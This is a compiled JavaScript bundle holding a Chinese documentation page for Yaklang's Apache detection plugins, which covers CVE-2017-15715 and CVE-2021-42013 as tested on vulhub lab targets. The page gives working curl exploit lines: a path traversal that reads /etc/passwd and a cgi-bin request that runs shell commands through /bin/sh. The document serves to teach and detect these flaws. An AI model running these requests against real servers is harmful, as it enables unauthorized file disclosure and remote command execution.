(self.webpackChunkyaklang=self.webpackChunkyaklang||[]).push([[3197],{3905:(e,t,n)=>{"use strict";n.d(t,{Zo:()=>s,kt:()=>m});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function c(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function p(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?c(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):c(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},c=Object.keys(e);for(r=0;r<c.length;r++)n=c[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(r=0;r<c.length;r++)n=c[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),o=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):p(p({},t),e)),n},s=function(e){var t=o(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},g=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,c=e.originalType,l=e.parentName,s=i(e,["components","mdxType","originalType","parentName"]),u=o(n),g=a,m=u["".concat(l,".").concat(g)]||u[g]||d[g]||c;return n?r.createElement(m,p(p({ref:t},s),{},{components:n})):r.createElement(m,p({ref:t},s))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var c=n.length,p=new Array(c);p[0]=g;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[u]="string"==typeof e?e:a,p[1]=i;for(var o=2;o<c;o++)p[o]=n[o];return r.createElement.apply(null,p)}return r.createElement.apply(null,n)}g.displayName="MDXCreateElement"},5308:(e,t,n)=>{"use strict";n.r(t),n.d(t,{frontMatter:()=>c,contentTitle:()=>p,metadata:()=>i,toc:()=>l,default:()=>s});var r=n(22122),a=(n(67294),n(3905));const c={sidebar_position:14},p="Apache\u63d2\u4ef6\u4f7f\u7528",i={unversionedId:"DetectionPlug-in/Apache",id:"DetectionPlug-in/Apache",isDocsHomePage:!1,title:"Apache\u63d2\u4ef6\u4f7f\u7528",description:"1 CVE-2017-15715",source:"@site/wiki/DetectionPlug-in/Apache.md",sourceDirName:"DetectionPlug-in",slug:"/DetectionPlug-in/Apache",permalink:"/wiki/DetectionPlug-in/Apache",tags:[],version:"current",sidebarPosition:14,frontMatter:{sidebar_position:14},sidebar:"teamSidebar",previous:{title:"Thinkphp\u63d2\u4ef6\u4f7f\u7528",permalink:"/wiki/DetectionPlug-in/Thinkphp"},next:{title:"Jenkins\u63d2\u4ef6\u4f7f\u7528",permalink:"/wiki/DetectionPlug-in/Jenkins"}},l=[{value:"1 CVE-2017-15715",id:"1-cve-2017-15715",children:[]},{value:"2 CVE-2021-42013",id:"2-cve-2021-42013",children:[]}],o={toc:l};function s(e){let{components:t,...c}=e;return(0,a.kt)("wrapper",(0,r.Z)({},o,c,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"apache\u63d2\u4ef6\u4f7f\u7528"},"Apache\u63d2\u4ef6\u4f7f\u7528"),(0,a.kt)("h2",{id:"1-cve-2017-15715"},"1 CVE-2017-15715"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.kt)("p",null,"f7c170b3-77de-4af3-8551-6da4ce1bd471"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u6f0f\u6d1e\u63cf\u8ff0\uff1a")),(0,a.kt)("p",null,"Apache HTTPD\u6362\u884c\u89e3\u6790\u6f0f\u6d1e\uff0cApache HTTPD\u662f\u4e00\u6b3eHTTP\u670d\u52a1\u5668\uff0c\u5b83\u53ef\u4ee5\u901a\u8fc7mod_php\u6765\u8fd0\u884cPHP\u7f51\u9875\u3002\u51762.4.0~2.4.29\u7248\u672c\u4e2d\u5b58\u5728\u4e00\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u5728\u89e3\u6790PHP\u65f6\uff0c1.php\\x0A\u5c06\u88ab\u6309\u7167PHP\u540e\u7f00\u8fdb\u884c\u89e3\u6790\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7684\u5b89\u5168\u7b56\u7565\u3002"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.kt)("p",null,"vulhub\u9776\u573a\u8bbf\u95ee\u6d4b\u8bd5\u7f51\u7ad9\uff0c\u4e0a\u4f20\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u88ab\u62e6\u622a"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(28840).Z})),(0,a.kt)("p",null,"\u57281.php\u540e\u9762\u63d2\u5165\u4e00\u4e2a\\x0A\uff0c\u6210\u529f\u4e0a\u4f20"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(49492).Z})),(0,a.kt)("p",null,"\u8bbf\u95ee\u521a\u624d\u4e0a\u4f20\u7684/1.php%0a\uff0c\u53d1\u73b0\u80fd\u591f\u6210\u529f\u89e3\u6790"),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(75516).Z})),(0,a.kt)("h2",{id:"2-cve-2021-42013"},"2 CVE-2021-42013"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u63d2\u4ef6id\uff1a")),(0,a.kt)("p",null,"239d9646-1ca4-471e-a9b4-5ab0534f759b"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u6f0f\u6d1e\u63cf\u8ff0\uff1a")),(0,a.kt)("p",null,"Apache HTTP Server 2.4.50 \u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u8bfb\u53d6\u4f4d\u4e8eApache\u670d\u52a1\u5668Web\u76ee\u5f55\u4ee5\u5916\u7684\u5176\u4ed6\u6587\u4ef6\uff0c\u6216\u8005\u8bfb\u53d6Web\u76ee\u5f55\u4e2d\u7684\u811a\u672c\u6587\u4ef6\u6e90\u7801\uff0c\u6216\u8005\u5728\u5f00\u542f\u4e86cgi\u6216cgid\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u6d4b\u8bd5\u8fc7\u7a0b\uff1a")),(0,a.kt)("p",null,"vulhub\u9776\u573a\u8bbf\u95ee\u6d4b\u8bd5\u7f51\u7ad9\uff0c\u4f7f\u7528.%%32%65\u8fdb\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u6210\u529f\u8bfb\u53d6\u5230/etc/passwd"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-go"},"curl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\n")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(72738).Z})),(0,a.kt)("p",null,"\u5728\u670d\u52a1\u7aef\u5f00\u542f\u4e86cgi\u6216cgid\u8fd9\u4e24\u4e2amod\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u8def\u5f84\u7a7f\u8d8a\u6f0f\u6d1e\u5c06\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-go"},"curl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'\n")),(0,a.kt)("p",null,(0,a.kt)("img",{src:n(1653).Z})))}s.isMDXComponent=!0},28840:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/apache-1-6a5fba9b661276608a211dc367cf96d5.png"},49492:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/apache-2-9d210b823da4ba52b1becb4f8c36c446.png"},75516:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/apache-3-8724244c1c35e22f458a42c1d7a62d1d.png"},72738:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/apache-4-d4be28840bb2d5ef8253cefcbdcc91e3.png"},1653:(e,t,n)=>{"use strict";n.d(t,{Z:()=>r});const r=n.p+"assets/images/apache-5-46080223bee7c549371e31189920ada2.png"}}]);